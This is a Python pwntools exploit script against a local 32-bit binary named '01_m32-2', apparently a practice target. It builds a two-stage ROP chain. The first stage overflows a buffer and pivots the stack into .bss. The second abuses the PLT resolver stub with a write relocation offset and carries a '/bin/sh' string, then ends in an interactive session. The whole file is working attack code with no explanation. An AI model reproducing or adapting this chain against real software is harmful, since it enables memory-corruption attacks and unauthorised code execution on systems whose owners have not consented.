#!/usr/bin/env python3
from pwn import *

elf = ELF("./01_m32-2")
rop = ROP(elf)

bufsize = int(sys.argv[1])

addr_plt_read = elf.plt["read"]     # objdump -d -j.plt a.out
addr_plt_write = elf.plt["write"]   # objdump -d -j.plt a.out
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr

addr_bss = elf.bss()                # readelf -S a.out

addr_pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"]).address         # 0x080484cd: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
addr_pop_ebp = rop.find_gadget(["pop ebp", "ret"]).address                            # 0x08048433: pop ebp ; ret  ;  (3 found)
addr_leave_ret = rop.find_gadget(["leave", "ret"]).address                            # 0x08048461: leave  ; ret  ;  (2 found)

stack_size = 0x800
base_stage = addr_bss + stack_size

target = process("./01_m32-2")

buf = b'A' * bufsize
buf += b'AAAA' * 3
buf += p32(addr_plt_read)
buf += p32(addr_pop3)
buf += p32(0)
buf += p32(base_stage)
buf += p32(100)
buf += p32(addr_pop_ebp)
buf += p32(base_stage)
buf += p32(addr_leave_ret)


_ = input()
target.send(p32(len(buf)))
target.send(buf)
print("[+] read: %r" % target.recv(len(buf)))

# 2nd stage
write_rel_offset = 0x10

cmd = b'/bin/sh <&2 >&2'

buf = b'AAAA'
buf += p32(addr_plt_start)
buf += p32(write_rel_offset)
buf += b'AAAA'
buf += p32(1)
buf += p32(base_stage+80)
buf += p32(len(cmd))
buf += b'A' * (80-len(buf))
buf += cmd + b'\x00'
buf += b'A' * (100-len(buf))

_ = input()

target.send(buf)
print("[+] read: %r" % target.recv(len(cmd)))

target.interactive()